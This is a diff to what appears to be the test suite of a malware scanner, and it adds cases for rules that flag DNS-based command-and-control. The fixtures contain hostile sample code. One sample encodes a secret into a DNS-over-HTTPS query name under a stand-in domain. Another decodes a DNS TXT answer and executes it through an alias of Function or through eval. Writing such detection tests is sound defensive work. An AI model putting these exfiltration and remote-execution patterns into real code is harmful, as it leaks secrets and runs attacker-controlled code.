@@ -75,6 +75,37 @@ describe("C2_DOH_RESOLVER and DEAD_DROP_DNS_TXT need a C2 signal for medium", ()
     expect(severities("C2_DOH_RESOLVER", content)).toEqual(["medium"]);
   });
 
+  it("reports a DoH query name encoded into a variable on the lines above at medium", () => {
+    for (const encode of ["base32(secret)", 'Buffer.from(secret).toString("base64url")']) {
+      const content = [
+        `const encoded = ${encode};`,
+        'const q = encoded + ".x.example";',
+        'fetch("https://dns.google/resolve?name=" + q + "&type=TXT");',
+      ].join("\n");
+      expect(severities("C2_DOH_RESOLVER", content), encode).toEqual(["medium"]);
+    }
+  });
+
+  it("does not reach an encoder more than five lines above the query", () => {
+    const content = [
+      "const encoded = base32(secret);",
+      ..."abcdef".split("").map((v) => `const ${v} = 1;`),
+      'fetch("https://dns.google/resolve?name=example.com&type=TXT");',
+    ].join("\n");
+    expect(severities("C2_DOH_RESOLVER", content)).toEqual(["low"]);
+  });
+
+  it("reports a TXT answer handed to an alias of Function at medium", () => {
+    const content = [
+      "dns.resolveTxt(d, (e, r) => {",
+      '  const payload = Buffer.from(r[0][0], "base64").toString();',
+      "  const F = Function;",
+      "  F(payload)();",
+      "});",
+    ].join("\n");
+    expect(severities("DEAD_DROP_DNS_TXT", content)).toEqual(["medium"]);
+  });
+
   it("reports a TXT answer decoded into eval at medium", () => {
     const content =
       'dns.resolveTxt(d, (e, r) => eval(Buffer.from(r[0][0], "base64").toString()));';
